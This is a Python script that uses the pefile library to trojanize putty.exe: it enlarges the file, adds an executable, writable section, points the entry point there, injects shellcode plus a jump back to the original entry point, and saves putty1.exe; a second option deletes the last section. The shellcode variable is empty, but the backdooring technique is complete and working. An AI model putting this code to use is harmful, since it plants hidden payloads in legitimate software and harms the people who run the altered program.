import pefile
import mmap
import os


def align(val_to_align, alignment):
    return round(((val_to_align + alignment - 1) / alignment)) * alignment

exe_path = "putty.exe"
shellcode = bytes(b"")

# STEP 0x01 - Resize the Executable
# Note: I added some more space to avoid error
# print "[*] STEP 0x01 - Resize the Executable"

original_size = os.path.getsize(exe_path)
# print "\t[+] Original Size = %d" % original_size
fd = open(exe_path, 'a+b')
map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
map.resize(original_size + 0x2000)
map.close()
fd.close()

# print "\t[+] New Size = %d bytes\n" % os.path.getsize(exe_path)

# STEP 0x02 - Add the New Section Header


def addSection(pe,shellcode):
	number_of_section = pe.FILE_HEADER.NumberOfSections
	last_section = number_of_section - 1
	file_alignment = pe.OPTIONAL_HEADER.FileAlignment
	section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
	new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)
	
	# Look for valid values for the new section header
	raw_size = align(0x1000, file_alignment)
	virtual_size = align(0x2000, section_alignment)
	raw_offset = align((pe.sections[last_section].PointerToRawData +
                    pe.sections[last_section].SizeOfRawData),
                   file_alignment)

	virtual_offset = align((pe.sections[last_section].VirtualAddress +
                        pe.sections[last_section].Misc_VirtualSize),
                       section_alignment)

# CODE | EXECUTE | READ | WRITE
	characteristics = 0xE0000020
# Section name must be equal to 8 bytes
	name = ".axc" 

# Create the section
# Set the name
	pe.set_bytes_at_offset(new_section_offset, bytes(name,'utf-8'))
# Set the virtual size
	pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
# Set the virtual offset
	pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
# Set the raw size
	pe.set_dword_at_offset(new_section_offset + 16, raw_size)
# Set the raw offset
	pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
# Set the following fields to zero
	pe.set_bytes_at_offset(new_section_offset + 24, b'\x00'*12)
# Set the characteristics
	pe.set_dword_at_offset(new_section_offset + 36, characteristics)
# STEP 0x03 - Modify the Main Headers
	pe.FILE_HEADER.NumberOfSections += 1
	pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
	pe.write("putty1.exe")
	pe = pefile.PE("putty1.exe")
	number_of_section = pe.FILE_HEADER.NumberOfSections
	last_section = number_of_section - 1
	new_ep = pe.sections[last_section].VirtualAddress
	oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint + 4194304
# # print "\t[+] Original Entry Point = %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
	pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep
	print("entrypoint: "+hex(oep))
# STEP 0x04 - Inject the Shellcode in the New Section
	shellcode += b'\xb8' + oep.to_bytes(4,'little') + b'\xff\xd0'
	#shellcode += b'\xB8\xc6\xf4\x46\x00\xFF\xD0'
	print(shellcode)
	raw_offset = pe.sections[last_section].PointerToRawData
	pe.set_bytes_at_offset(raw_offset, shellcode)
	print(hex(raw_offset))
	print(hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
	pe.write("putty1.exe")
# # # #
def delSection(pe):
	if (pe.FILE_HEADER.NumberOfSections > 0 and pe.FILE_HEADER.NumberOfSections == len(pe.sections)):
		if pe.sections[-1].SizeOfRawData != 0:
			pe.__data__ = (pe.__data__[:pe.sections[-1].PointerToRawData] + \
                                    pe.__data__[pe.sections[-1].PointerToRawData + \
                                                        pe.sections[-1].SizeOfRawData:])
#			pe.sections[-1].Name = '\x00'*8
#			pe.sections[-1].Misc_VirtualSize = 0x00000000
#			pe.sections[-1].VirtualAddress = 0x00000000
#			pe.sections[-1].SizeOfRawData = 0x00000000
#			pe.sections[-1].PointerToRawData = 0x00000000
#			pe.sections[-1].PointerToRelocations = 0x00000000
#			pe.sections[-1].PointerToLinenumbers = 0x00000000
#			pe.sections[-1].NumberOfRelocations = 0x0000
#			pe.sections[-1].NumberOfLinenumbers = 0x0000
#			pe.sections[-1].Characteristics = 0x00000000
			pe.sections.pop()
			pe.FILE_HEADER.NumberOfSections -=1
			pe.OPTIONAL_HEADER.SizeOfImage = (pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize)
			pe.OPTIONAL_HEADER.SizeOfCode = 0
			pe.OPTIONAL_HEADER.SizeOfInitializedData = 0
			pe.OPTIONAL_HEADER.SizeOfUninitializedData = 0
			pe.write("putty1.exe")
# # # #
pe = pefile.PE(exe_path)
print("1.Add Section\n2.Del Section")
opt=input()
if(int(opt)==1):
	addSection(pe,shellcode)
elif(int(opt)==2):
	delSection(pe)


print("Done")

